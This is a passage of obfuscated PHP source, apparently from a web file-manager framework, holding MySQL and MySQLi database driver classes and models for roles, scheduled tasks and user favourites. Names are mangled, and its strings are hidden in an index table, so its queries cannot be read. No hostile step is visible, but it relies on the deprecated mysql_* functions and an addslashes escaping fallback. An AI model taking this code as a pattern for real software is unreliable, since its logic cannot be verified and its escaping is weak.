!empty($…à£ÇÍÊ[$«û¬Ëµ“[21]]) && !mysql_select_db($…à£ÇÍÊ[$«û¬Ëµ“[21]], $this->linkID[$—ùüÖ²ô])) { think_exception(mysql_error()); } $’¤é•É« = mysql_get_server_info($this->linkID[$—ùüÖ²ô]); mysql_query($«û¬Ëµ“[893] . think_config($«û¬Ëµ“[894]) . $«û¬Ëµ“[58], $this->linkID[$—ùüÖ²ô]); if ($’¤é•É« > $«û¬Ëµ“[895]) { mysql_query($«û¬Ëµ“[896], $this->linkID[$—ùüÖ²ô]); } $this->connected = !0; if (1 != think_config($«û¬Ëµ“[22])) { unset($this->config); } } return $this->linkID[$—ùüÖ²ô]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ô“­ÊÀÉ) { $µ»³•Î£ =& $_SERVER[Ü©»’·]; if (0 === stripos($Ô“­ÊÀÉ, $µ»³•Î£[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ô“­ÊÀÉ; if ($this->queryID) { $this->free(); } think_action_status($µ»³•Î£[23], 1); think_status($µ»³•Î£[24]); $this->queryID = mysql_query($Ô“­ÊÀÉ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ëÎ¤ÌÕ) { $áÚ¾—Ô¨ =& $_SERVER[Ü©»’·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ëÎ¤ÌÕ; if ($this->queryID) { $this->free(); } think_action_status($áÚ¾—Ô¨[25], 1); think_status($áÚ¾—Ô¨[24]); $‘İ×ªàä = mysql_query($ëÎ¤ÌÕ, $this->_linkID); $this->debug(); if (!1 === $‘İ×ªàä) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ü©»’·][897], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ïî‘ú¥Š = mysql_query($_SERVER[Ü©»’·][898], $this->_linkID); $this->transTimes = 0; if (!$Ïî‘ú¥Š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¦æ±õ¶ß = mysql_query($_SERVER[Ü©»’·][899], $this->_linkID); $this->transTimes = 0; if (!$¦æ±õ¶ß) { $this->error(); return !1; } } return !0; } private function getAll() { $²Ó˜ÑĞ± = array(); if ($this->numRows > 0) { while ($­©…¥ = mysql_fetch_assoc($this->queryID)) { $²Ó˜ÑĞ±[] = $­©…¥; } mysql_data_seek($this->queryID, 0); } return $²Ó˜ÑĞ±; } public function getFields($°§›ú·ğ) { $¶ì‹Ü‰ã =& $_SERVER[Ü©»’·]; $¾Ë¾ûµÇ = $this->query($¶ì‹Ü‰ã[900] . $this->parseKey($°§›ú·ğ)); $³ŠÖ˜æ = array(); if ($¾Ë¾ûµÇ) { foreach ($¾Ë¾ûµÇ as $…ÜåÈÊ± => $¬ÇÄİ³) { $³ŠÖ˜æ[$¬ÇÄİ³[$¶ì‹Ü‰ã[31]]] = array($¶ì‹Ü‰ã[32] => $¬ÇÄİ³[$¶ì‹Ü‰ã[31]], $¶ì‹Ü‰ã[33] => $¬ÇÄİ³[$¶ì‹Ü‰ã[34]], $¶ì‹Ü‰ã[35] => (bool) (strtoupper($¬ÇÄİ³[$¶ì‹Ü‰ã[36]]) === $¶ì‹Ü‰ã[901]), $¶ì‹Ü‰ã[37] => $¬ÇÄİ³[$¶ì‹Ü‰ã[38]], $¶ì‹Ü‰ã[39] => strtolower($¬ÇÄİ³[$¶ì‹Ü‰ã[40]]) == $¶ì‹Ü‰ã[41], $¶ì‹Ü‰ã[42] => strtolower($¬ÇÄİ³[$¶ì‹Ü‰ã[43]]) == $¶ì‹Ü‰ã[44]); } } return $³ŠÖ˜æ; } public function getTables($üìÍø° = '') { $È¬‡Ì‰Ä =& $_SERVER[Ü©»’·]; if (!empty($üìÍø°)) { $âŸçåŞ” = $È¬‡Ì‰Ä[902] . $üìÍø° . $È¬‡Ì‰Ä[903]; } else { $âŸçåŞ” = $È¬‡Ì‰Ä[904]; } $¯¼Çô§ = $this->query($âŸçåŞ”); $†§…‚˜š = array(); foreach ($¯¼Çô§ as $ñŸô¾…” => $ê†¤¸ßÍ) { $†§…‚˜š[$ñŸô¾…”] = current($ê†¤¸ßÍ); } return $†§…‚˜š; } public function replace($ÛêÅô€¤, $ş—ûœª = array()) { $°¹ºãÑ„ =& $_SERVER[Ü©»’·]; foreach ($ÛêÅô€¤ as $öíØø÷ => $€œ´õÇ²) { $å¸¼ìé› = $this->parseValue($€œ´õÇ²); if (is_scalar($å¸¼ìé›)) { $Ú«„…ö±[] = $å¸¼ìé›; $ò¼­¹Ü³[] = $this->parseKey($öíØø÷); } } $¡…úÜ½È = $°¹ºãÑ„[905] . $this->parseTable($ş—ûœª[$°¹ºãÑ„[279]]) . $°¹ºãÑ„[906] . implode($°¹ºãÑ„[50], $ò¼­¹Ü³) . $°¹ºãÑ„[907] . implode($°¹ºãÑ„[50], $Ú«„…ö±) . $°¹ºãÑ„[908]; return $this->execute($¡…úÜ½È); } public function insertAll($·Õí«Š, $ñÎ„›Õ = array(), $ëÆ’º¹ˆ = false) { $Íãä€¸é =& $_SERVER[Ü©»’·]; if (!is_array($·Õí«Š[0])) { return !1; } $ˆğî£¡³ = array_keys($·Õí«Š[0]); $ìåÚ¡îõ = array(); foreach ($·Õí«Š as $Ê‡ùàŒÃ) { $úïá“¥é = array(); foreach ($Ê‡ùàŒÃ as $ô¾£ŞŸ§ => $¹‹†êÍñ) { $¹‹†êÍñ = $this->parseValue($¹‹†êÍñ); if (is_scalar($¹‹†êÍñ)) { $úïá“¥é[] = $¹‹†êÍñ; } } $ìåÚ¡îõ[] = $Íãä€¸é[260] . implode($Íãä€¸é[50], $úïá“¥é) . $Íãä€¸é[908]; } array_walk($ˆğî£¡³, array($this, $Íãä€¸é[909])); $ÌÙŸÑµˆ = ($ëÆ’º¹ˆ ? $Íãä€¸é[910] : $Íãä€¸é[911]) . $Íãä€¸é[912] . $this->parseTable($ñÎ„›Õ[$Íãä€¸é[279]]) . $Íãä€¸é[906] . implode($Íãä€¸é[50], $ˆğî£¡³) . $Íãä€¸é[913] . implode($Íãä€¸é[50], $ìåÚ¡îõ); return $this->execute($ÌÙŸÑµˆ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ê…•äŠ =& $_SERVER[Ü©»’·]; $this->error = mysql_errno() . $ê…•äŠ[4] . mysql_error($this->_linkID); if ($ê…•äŠ[12] != $this->queryStr) { $this->error .= LNG($ê…•äŠ[48]) . $this->queryStr; } think_trace($this->error, $ê…•äŠ[12], $ê…•äŠ[49]); return $this->error; } public function escapeString($ÒúŠ¹ï) { if ($this->_linkID) { return mysql_real_escape_string($ÒúŠ¹ï, $this->_linkID); } else { return mysql_escape_string($ÒúŠ¹ï); } } public function parseKey(&$Æöı“æë, $ÂèÛÚ¯Ó = true) { $ˆ›ÕÆü³ =& $_SERVER[Ü©»’·]; if ($ÂèÛÚ¯Ó) { $Æöı“æë = $this->parseKeyCheck($Æöı“æë); } if ($Æöı“æë != $ˆ›ÕÆü³[188] && !preg_match($ˆ›ÕÆü³[914], $Æöı“æë)) { $Æöı“æë = $ˆ›ÕÆü³[394] . trim($Æöı“æë, $ˆ›ÕÆü³[394]) . $ˆ›ÕÆü³[394]; } return $Æöı“æë; } } class DbMysqli extends Db { public function __construct($À—Ù©Û¿ = '') { $ªü»·—õ =& $_SERVER[Ü©»’·]; if (!extension_loaded($ªü»·—õ[915])) { think_exception(think_lang($ªü»·—õ[14]) . $ªü»·—õ[916]); } if (!empty($À—Ù©Û¿)) { $this->config = $À—Ù©Û¿; if (empty($this->config[$ªü»·—õ[17]])) { $this->config[$ªü»·—õ[17]] = $ªü»·—õ[12]; } } } public function connect($€ÂôîÔ = '', $ÂÈê·Û† = 0) { $€í¯€Ú° =& $_SERVER[Ü©»’·]; if (!isset($this->linkID[$ÂÈê·Û†])) { if (empty($€ÂôîÔ)) { $€ÂôîÔ = $this->config; } $this->linkID[$ÂÈê·Û†] = new mysqli($€ÂôîÔ[$€í¯€Ú°[889]], $€ÂôîÔ[$€í¯€Ú°[891]], $€ÂôîÔ[$€í¯€Ú°[892]], $€ÂôîÔ[$€í¯€Ú°[21]], $€ÂôîÔ[$€í¯€Ú°[890]] ? intval($€ÂôîÔ[$€í¯€Ú°[890]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ˆÖ¥ÕÍ = $this->linkID[$ÂÈê·Û†]->server_version; $this->linkID[$ÂÈê·Û†]->query($€í¯€Ú°[893] . think_config($€í¯€Ú°[894]) . $€í¯€Ú°[58]); if ($ˆÖ¥ÕÍ > $€í¯€Ú°[895]) { $this->linkID[$ÂÈê·Û†]->query($€í¯€Ú°[896]); } $this->connected = !0; if (1 != think_config($€í¯€Ú°[22])) { unset($this->config); } } return $this->linkID[$ÂÈê·Û†]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ì¨ÊÃ×Ã) { $áÎŒêö¾ =& $_SERVER[Ü©»’·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ì¨ÊÃ×Ã; if ($this->queryID) { $this->free(); } think_action_status($áÎŒêö¾[23], 1); think_status($áÎŒêö¾[24]); $this->queryID = $this->_linkID->query($ì¨ÊÃ×Ã); if ($this->_linkID->more_results()) { while (($İÀê±ûª = $this->_linkID->next_result()) != NULL) { $İÀê±ûª->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Í—Ã­İ×) { $Ş“±îã‹ =& $_SERVER[Ü©»’·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Í—Ã­İ×; if ($this->queryID) { $this->free(); } think_action_status($Ş“±îã‹[25], 1); think_status($Ş“±îã‹[24]); $À…›ä¶• = $this->_linkID->query($Í—Ã­İ×); $this->debug(); if (!1 === $À…›ä¶•) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÄœØéÌö = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÄœØéÌö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨¡–‚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¨¡–‚) { $this->error(); return !1; } } return !0; } private function getAll() { $ë„—¼ææ = array(); if ($this->numRows > 0) { for ($ÅÅÎÆÂ¯ = 0; $ÅÅÎÆÂ¯ < $this->numRows; $ÅÅÎÆÂ¯++) { $ë„—¼ææ[$ÅÅÎÆÂ¯] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ë„—¼ææ; } public function getFields($”Ô›ä¤ò) { $—úàœ¬Ä =& $_SERVER[Ü©»’·]; $ÄƒÓÍ©Ã = $this->query($—úàœ¬Ä[900] . $this->parseKey($”Ô›ä¤ò)); $¯ºÌ…óÊ = array(); if ($ÄƒÓÍ©Ã) { foreach ($ÄƒÓÍ©Ã as $ƒÂ·©ñı => $´”¯ì‹´) { $¯ºÌ…óÊ[$´”¯ì‹´[$—úàœ¬Ä[31]]] = array($—úàœ¬Ä[32] => $´”¯ì‹´[$—úàœ¬Ä[31]], $—úàœ¬Ä[33] => $´”¯ì‹´[$—úàœ¬Ä[34]], $—úàœ¬Ä[35] => (bool) ($´”¯ì‹´[$—úàœ¬Ä[36]] === $—úàœ¬Ä[12]), $—úàœ¬Ä[37] => $´”¯ì‹´[$—úàœ¬Ä[38]], $—úàœ¬Ä[39] => strtolower($´”¯ì‹´[$—úàœ¬Ä[40]]) == $—úàœ¬Ä[41], $—úàœ¬Ä[42] => strtolower($´”¯ì‹´[$—úàœ¬Ä[43]]) == $—úàœ¬Ä[44]); } } return $¯ºÌ…óÊ; } public function getTables($ü„ÃÉÃ¯ = '') { $Ùğ¬ºÜÏ =& $_SERVER[Ü©»’·]; $Ü°‰—ÃÆ = !empty($ü„ÃÉÃ¯) ? $Ùğ¬ºÜÏ[902] . $ü„ÃÉÃ¯ . $Ùğ¬ºÜÏ[903] : $Ùğ¬ºÜÏ[904]; $ı¡ÊÚÄú = $this->query($Ü°‰—ÃÆ); $ï†Ü£Ö© = array(); if ($ı¡ÊÚÄú) { foreach ($ı¡ÊÚÄú as $á®œßŞ => $ñÚè‡áù) { $ï†Ü£Ö©[$á®œßŞ] = current($ñÚè‡áù); } } return $ï†Ü£Ö©; } public function replace($°·úº„, $¶Ø½öÊ½ = array()) { $¢ğ¹™²¨ =& $_SERVER[Ü©»’·]; foreach ($°·úº„ as $ß‰ÇÈ¿ü => $åÎóˆÃ¹) { $‚èÚÎş = $this->parseValue($åÎóˆÃ¹); if (is_scalar($‚èÚÎş)) { $İ»×Ô[] = $‚èÚÎş; $ŒÖ»îõ[] = $this->parseKey($ß‰ÇÈ¿ü); } } $ÑØ¹û²‡ = $¢ğ¹™²¨[905] . $this->parseTable($¶Ø½öÊ½[$¢ğ¹™²¨[279]]) . $¢ğ¹™²¨[906] . implode($¢ğ¹™²¨[50], $ŒÖ»îõ) . $¢ğ¹™²¨[907] . implode($¢ğ¹™²¨[50], $İ»×Ô) . $¢ğ¹™²¨[908]; return $this->execute($ÑØ¹û²‡); } public function insertAll($äÃŞ¼¡ì, $¡¯Ó«‰ğ = array(), $—ÁùÏá£ = false) { $¦ÕÏ‰÷Ò =& $_SERVER[Ü©»’·]; if (!is_array($äÃŞ¼¡ì[0])) { return !1; } $Ğ¦ÙÖ™ = array_keys($äÃŞ¼¡ì[0]); $‡òî¯ç‘ = array(); foreach ($äÃŞ¼¡ì as $†¡Ê…°) { $ßÒûí = array(); foreach ($†¡Ê…° as $¿êŸŸ›· => $ÉŸªÖÌØ) { $ÉŸªÖÌØ = $this->parseValue($ÉŸªÖÌØ); if (is_scalar($ÉŸªÖÌØ)) { $ßÒûí[] = $ÉŸªÖÌØ; } } $‡òî¯ç‘[] = $¦ÕÏ‰÷Ò[260] . implode($¦ÕÏ‰÷Ò[50], $ßÒûí) . $¦ÕÏ‰÷Ò[908]; } array_walk($Ğ¦ÙÖ™, array($this, $¦ÕÏ‰÷Ò[909])); $ª÷ü¨‹Ã = $—ÁùÏá£ ? $¦ÕÏ‰÷Ò[910] : $¦ÕÏ‰÷Ò[911]; $¦ò‹Ú¹ç = $ª÷ü¨‹Ã . $¦ÕÏ‰÷Ò[912] . $this->parseTable($¡¯Ó«‰ğ[$¦ÕÏ‰÷Ò[279]]) . $¦ÕÏ‰÷Ò[906] . implode($¦ÕÏ‰÷Ò[50], $Ğ¦ÙÖ™) . $¦ÕÏ‰÷Ò[913] . implode($¦ÕÏ‰÷Ò[50], $‡òî¯ç‘); return $this->execute($¦ò‹Ú¹ç); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $º˜Ûƒ =& $_SERVER[Ü©»’·]; $this->error = $this->_linkID->errno . $º˜Ûƒ[4] . $this->_linkID->error; if ($º˜Ûƒ[12] != $this->queryStr) { $this->error .= LNG($º˜Ûƒ[48]) . $this->queryStr; } think_trace($this->error, $º˜Ûƒ[12], $º˜Ûƒ[49]); return $this->error; } public function escapeString($Š„á‚Şë) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Š„á‚Şë); } else { return addslashes($Š„á‚Şë); } } public function parseKey(&$ÌŒÆ¨ô , $ŒÙ“¾Ş² = true) { $Ú¿İ—çÛ =& $_SERVER[Ü©»’·]; if ($ŒÙ“¾Ş²) { $ÌŒÆ¨ô  = $this->parseKeyCheck($ÌŒÆ¨ô ); } if ($ÌŒÆ¨ô  != $Ú¿İ—çÛ[188] && !preg_match($Ú¿İ—çÛ[914], $ÌŒÆ¨ô )) { $ÌŒÆ¨ô  = $Ú¿İ—çÛ[394] . trim($ÌŒÆ¨ô , $Ú¿İ—çÛ[394]) . $Ú¿İ—çÛ[394]; } return $ÌŒÆ¨ô ; } } goto BÇ²ò•†¸æ; d¹•Úã¥¢á: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\x72\157\x6c\x65\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x61\x75\164\x68", "\154\141\x62\x65\x6c", "\144\151\163\x70\154\141\171", "\163\171\163\164\145\x6d", "\144\145\163\143", "\151\x67\156\157\162\x65\105\170\164", "\x69\147\156\157\x72\145\x46\151\154\145\x53\151\172\145", "\x61\144\155\151\156\x69\163\164\162\x61\164\157\x72", "\163\157\x72\164"); public function listData($„Úğ¡¶  = false, $ñìÙÚ»ã = "\x73\157\162\164", $Ğ×Ô¤ô = false) { $ã¡•ƒ =& $_SERVER[Ü©»’·]; $¾£¶›•š = parent::listData($„Úğ¡¶ , $ñìÙÚ»ã, $Ğ×Ô¤ô); if (!$„Úğ¡¶ ) { foreach ($¾£¶›•š as $ÒÙˆ”–Ø => $­–¨ˆ„) { if ($­–¨ˆ„[$ã¡•ƒ[2056]] == 1) { $¾£¶›•š[$ÒÙˆ”–Ø][$ã¡•ƒ[462]] = LNG($ã¡•ƒ[2290]); } } } return $¾£¶›•š; } public function update($ˆèç ÷, $Å¶¯†õş) { $×ê‘”–² =& $_SERVER[Ü©»’·]; $˜÷á³Ü = parent::listData($ˆèç ÷); $¹È­ˆ‹“ = $this->findByName($Å¶¯†õş[$×ê‘”–²[32]]); if (!$˜÷á³Ü || $¹È­ˆ‹“ && $¹È­ˆ‹“[$×ê‘”–²[408]] != $˜÷á³Ü[$×ê‘”–²[408]]) { return !1; } if ($¹È­ˆ‹“[$×ê‘”–²[2056]] == 1) { $Å¶¯†õş = array($×ê‘”–²[32] => $Å¶¯†õş[$×ê‘”–²[32]], $×ê‘”–²[1881] => $Å¶¯†õş[$×ê‘”–²[1881]]); } $this->filterAuth($Å¶¯†õş[$×ê‘”–²[422]]); return parent::update($ˆèç ÷, $Å¶¯†õş); } public function remove($ô’¦¸Ãæ) { $ƒ×ìÖâ = parent::listData($ô’¦¸Ãæ); if (!$ƒ×ìÖâ || $ƒ×ìÖâ[$_SERVER[Ü©»’·][1288]]) { return !1; } return parent::remove($ô’¦¸Ãæ); } public function add($áğ›˜Œ) { $¥âœå¢ë =& $_SERVER[Ü©»’·]; $©ÁÂ…Û€ = $áğ›˜Œ[$¥âœå¢ë[32]]; if ($this->findByName($©ÁÂ…Û€)) { return !1; } $â“ˆ“œ“ = array($¥âœå¢ë[429] => $©ÁÂ…Û€, $¥âœå¢ë[1864] => $¥âœå¢ë[12], $¥âœå¢ë[1860] => $¥âœå¢ë[1868], $¥âœå¢ë[2291] => 1, $¥âœå¢ë[1863] => 0, $¥âœå¢ë[2292] => 0, $¥âœå¢ë[1862] => $this->getSort()); $áğ›˜Œ = array_merge($â“ˆ“œ“, $áğ›˜Œ); $this->filterAuth($áğ›˜Œ[$¥âœå¢ë[422]]); return parent::insert($áğ›˜Œ); } private function getSort() { $ˆ­õîÒ =& $_SERVER[Ü©»’·]; $ºòü©ÉÈ = parent::listData(); $ï¸á›œ½ = array_to_keyvalue($ºòü©ÉÈ, $ˆ­õîÒ[12], $ˆ­õîÒ[1882]); return empty($ï¸á›œ½) ? 0 : max($ï¸á›œ½) + 1; } private function filterAuth(&$Ï…üá¦) { $©†Ïğ® =& $_SERVER[Ü©»’·]; $”û«µ¿¢ = array(); $£âÚüî‹ = array_filter(explode($©†Ïğ®[50], $Ï…üá¦)); foreach ($£âÚüî‹ as $Ï…üá¦) { $¯Ø…“°¶ = explode($©†Ïğ®[10], $Ï…üá¦); if ($¯Ø…“°¶[0] == $©†Ïğ®[2293] && $¯Ø…“°¶[1] != $©†Ïğ®[1194]) { $´÷ĞĞøé = $¯Ø…“°¶[0] . $©†Ïğ®[10] . $¯Ø…“°¶[1] . $©†Ïğ®[2294]; if (!in_array($´÷ĞĞøé, $£âÚüî‹)) { $”û«µ¿¢[] = $´÷ĞĞøé; } } $”û«µ¿¢[] = $Ï…üá¦; } $Ï…üá¦ = implode($©†Ïğ®[50], $”û«µ¿¢); } public function findRoleDefault() { $¿÷‘™ÃÆ =& $_SERVER[Ü©»’·]; $à¹Ïåæ× = parent::listData(); $×‘ƒî…œ = !1; foreach ($à¹Ïåæ× as $Ï°ÑıÓ) { if (!$Ï°ÑıÓ || $Ï°ÑıÓ[$¿÷‘™ÃÆ[1880]] == $¿÷‘™ÃÆ[197] || $Ï°ÑıÓ[$¿÷‘™ÃÆ[2056]] == 1) { continue; } if (strstr($Ï°ÑıÓ[$¿÷‘™ÃÆ[422]], $¿÷‘™ÃÆ[2295])) { continue; } if (!strstr($Ï°ÑıÓ[$¿÷‘™ÃÆ[422]], $¿÷‘™ÃÆ[2296])) { continue; } if (!$×‘ƒî…œ) { $×‘ƒî…œ = $Ï°ÑıÓ; continue; } $å èÓÉË = explode($¿÷‘™ÃÆ[50], $×‘ƒî…œ[$¿÷‘™ÃÆ[422]]); $œ¿»Û¬è = explode($¿÷‘™ÃÆ[50], $Ï°ÑıÓ[$¿÷‘™ÃÆ[422]]); if (count($å èÓÉË) > count($œ¿»Û¬è)) { $×‘ƒî…œ = $Ï°ÑıÓ; } } return $×‘ƒî…œ ? $×‘ƒî…œ[$¿÷‘™ÃÆ[408]] : $¿÷‘™ÃÆ[12]; } public function sort($¹»ÛşˆØ, $ÔÍëø•‹) { return parent::update($¹»ÛşˆØ, $ÔÍëø•‹); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x74\x61\x73\153\114\151\163\x74"; public $field = array("\x6e\141\155\x65", "\x74\x79\x70\x65", "\145\x76\145\x6e\x74", "\x74\151\x6d\145", "\x64\145\x73\x63", "\x73\x79\163\x74\x65\155", "\x65\156\x61\142\154\145", "\x6c\x61\x73\x74\122\x75\x6e", "\163\157\162\164"); public function listData($—ĞÏœË§ = false, $å»ı§‘İ = "\x73\157\x72\x74", $ÒÙüŸ‘à = false) { return parent::listData($—ĞÏœË§, $å»ı§‘İ, $ÒÙüŸ‘à); } public function add($»ŸàÉƒ¡) { $İğ€€ªÆ =& $_SERVER[Ü©»’·]; $ÆÆÇÄÁÅ = $this->findByName($»ŸàÉƒ¡[$İğ€€ªÆ[32]]); if ($ÆÆÇÄÁÅ) { return !1; } $»ŸàÉƒ¡[$İğ€€ªÆ[1629]] = 0; $»ŸàÉƒ¡[$İğ€€ªÆ[1882]] = $this->getSort(); return parent::insert($»ŸàÉƒ¡); } private function getSort() { $‚¥î²¯ =& $_SERVER[Ü©»’·]; $êù––—³ = parent::listData(); $¤¬ÍØ¬¹ = array_to_keyvalue($êù––—³, $‚¥î²¯[12], $‚¥î²¯[1882]); return empty($¤¬ÍØ¬¹) ? 0 : max($¤¬ÍØ¬¹) + 1; } public function update($ç•İ¹¥§, $îß¿¾æ¡) { $®æÄÏ‰Ö =& $_SERVER[Ü©»’·]; $ÜíîàÕ± = $this->listData($ç•İ¹¥§); $Ô°’ë©ı = $this->findByName($îß¿¾æ¡[$®æÄÏ‰Ö[32]]); if (!$ÜíîàÕ± || $Ô°’ë©ı && $Ô°’ë©ı[$®æÄÏ‰Ö[408]] != $ÜíîàÕ±[$®æÄÏ‰Ö[408]]) { return !1; } return parent::update($ç•İ¹¥§, $îß¿¾æ¡); } public function remove($¯ıÂÓç£, $•˜…’·õ = false) { $¹£ì•§Ğ =& $_SERVER[Ü©»’·]; $®¾ÉûØ = $this->listData($¯ıÂÓç£); if (!$®¾ÉûØ) { return; } if (!$•˜…’·õ && $®¾ÉûØ[$¹£ì•§Ğ[1288]] == $¹£ì•§Ğ[88]) { return !1; } return parent::remove($¯ıÂÓç£); } public function enable($®È¬•„, $Ê¦¦®) { return $this->update($®È¬•„, array($_SERVER[Ü©»’·][2285] => $Ê¦¦®)); } public function run($àğœÈÉÕ) { return $this->update($àğœÈÉÕ, array($_SERVER[Ü©»’·][2297] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($ó’¶ù®¤) { $¥Ğ’ˆœ =& $_SERVER[Ü©»’·]; return array($¥Ğ’ˆœ[1969] => array(USER_ID, $¥Ğ’ˆœ[2298])); } protected function listData() { $™¾Êˆâ« =& $_SERVER[Ü©»’·]; $Ç¾¸¥—Ø = array($™¾Êˆâ«[1660] => USER_ID, $™¾Êˆâ«[493] => 0); $ëó¦Öş = $™¾Êˆâ«[2299]; $–›Ì«Ô‹ = $this->field($ëó¦Öş)->where($Ç¾¸¥—Ø)->order($™¾Êˆâ«[2300])->select(); return $–›Ì«Ô‹ ? $–›Ì«Ô‹ : array(); } protected function resetCache() { } protected function listView() { $ÀôËšù¸ =& $_SERVER[Ü©»’·]; $èğÄó´æ = $this->listData(); $ˆÌ÷Ôóô = array_filter_by_field($èğÄó´æ, $ÀôËšù¸[33], $ÀôËšù¸[425]); $ıáÊ®ë = array_to_keyvalue($ˆÌ÷Ôóô, $ÀôËšù¸[12], $ÀôËšù¸[84]); if (!$ıáÊ®ë) { return $èğÄó´æ; } $şº¶¿‹ş = 2000; $ÅÅõ¦µ™ = array($ÀôËšù¸[426] => array($ÀôËšù¸[427], $ıáÊ®ë)); $Õ¿Ûáø“ = Model($ÀôËšù¸[831])->listSource($ÅÅõ¦µ™, $şº¶¿‹ş); $Õ¿Ûáø“ = array_merge($Õ¿Ûáø“[$ÀôËšù¸[83]], $Õ¿Ûáø“[$ÀôËšù¸[82]]); $Õ¿Ûáø“ = array_to_keyvalue($Õ¿Ûáø“, $ÀôËšù¸[411]); foreach ($èğÄó´æ as $Âœ¨Ì™ => $¤Ó÷Åíñ) { $£Ô«ØÔ = $Õ¿Ûáø“[$¤Ó÷Åíñ[$ÀôËšù¸[84]]]; $£Ô«ØÔ = $£Ô«ØÔ ? $£Ô«ØÔ : array(); $èğÄó´æ[$Âœ¨Ì™] = array_merge($£Ô«ØÔ, $¤Ó÷Åíñ); } return $èğÄó´æ; } protected function addFav($¡‰´­ƒÇ, $ëª©­¶Ÿ = '', $àÕ¸†Ğ  = "\x73\x6f\x75\x72\143\145") { $…óÅ×ÄÃ =& $_SERVER[Ü©»’·]; $£Ê€‡Ù = array($…óÅ×ÄÃ[1660] => USER_ID, $…óÅ×ÄÃ[493] => 0, $…óÅ×ÄÃ[431] => $àÕ¸†Ğ , $…óÅ×ÄÃ[430] => $¡‰´­ƒÇ); if ($this->where($£Ê€‡Ù)->find()) { return !1; } $£Ê€‡Ù = array($…óÅ×ÄÃ[1660] => USER_ID, $…óÅ×ÄÃ[493] => 0); $á¢£€ì = $this->where($£Ê€‡Ù)->max($…óÅ×ÄÃ[1882]); if (!$á¢£€ì) { $á¢£€ì = 0; } if (!$ëª©­¶Ÿ && $àÕ¸†Ğ  == $…óÅ×ÄÃ[425]) { $Õø…üÉ = Model($…óÅ×ÄÃ[1339])->where(array($…óÅ×ÄÃ[426] => $¡‰´­ƒÇ))->find(); if (!$Õø…üÉ) { return !1; } $ëª©­¶Ÿ = $Õø…üÉ[$…óÅ×ÄÃ[32]]; } $ëª©­¶Ÿ = $this->getAutoName($ëª©­¶Ÿ); $Ú–Ù——Ê = array($…óÅ×ÄÃ[1660] => USER_ID, $…óÅ×ÄÃ[493] => 0, $…óÅ×ÄÃ[429] => $ëª©­¶Ÿ, $…óÅ×ÄÃ[430] => $¡‰´­ƒÇ, $…óÅ×ÄÃ[431] => $àÕ¸†Ğ , $…óÅ×ÄÃ[1862] => $á¢£€ì + 1); return $this->add($Ú–Ù——Ê); } protected function remove($áÕº’–ï) { $öï¬‡ÕØ =& $_SERVER[Ü©»’·]; $¤æìğÁˆ = array($öï¬‡ÕØ[1660] => USER_ID, $öï¬‡ÕØ[428] => $áÕº’–ï); return $this->where($¤æìğÁˆ)->delete(); } protected function removeByName($ºÅûâáø) { $ä»‡Á¼ô =& $_SERVER[Ü©»’·]; $¬»ùì£” = array($ä»‡Á¼ô[1660] => USER_ID, $ä»‡Á¼ô[429] => $ºÅûâáø, $ä»‡Á¼ô[493] => 0); return $this->where($¬»ùì£”)->delete(); } protected function rename($·×Ã¬Û», $şëşÓÃ) { $°Õ•·Ûƒ =& $_SERVER[Ü©»’·]; if ($·×Ã¬Û» == $şëşÓÃ) { return !1; } $•İ’”ôÏ = $this->getAutoName($şëşÓÃ); if ($şëşÓÃ != $•İ’”ôÏ) { return !1; } $‰üàß¹Ó = array($°Õ•·Ûƒ[1660] => USER_ID, $°Õ•·Ûƒ[493] => 0, $°Õ•·Ûƒ[32] => $·×Ã¬Û»); return $this->where($‰üàß¹Ó)->save(array($°Õ•·Ûƒ[32] => $şëşÓÃ)); } protected function resetSort($ò÷»ø‡) { $ìó¿è† =& $_SERVER[Ü©»’·]; $ò÷»ø‡ = is_array($ò÷»ø‡) ? $ò÷»ø‡ : array(); $Şæ¢º÷è = array($ìó¿è†[1660] => USER_ID); for ($»ÑËè‘ã = 0; $»ÑËè‘ã < count($ò÷»ø‡); $»ÑËè‘ã++) { $Şæ¢º÷è[$ìó¿è†[428]] = $ò÷»ø‡[$»ÑËè‘ã]; $this->where($Şæ¢º÷è)->save(array($ìó¿è†[1862] => $»ÑËè‘ã + 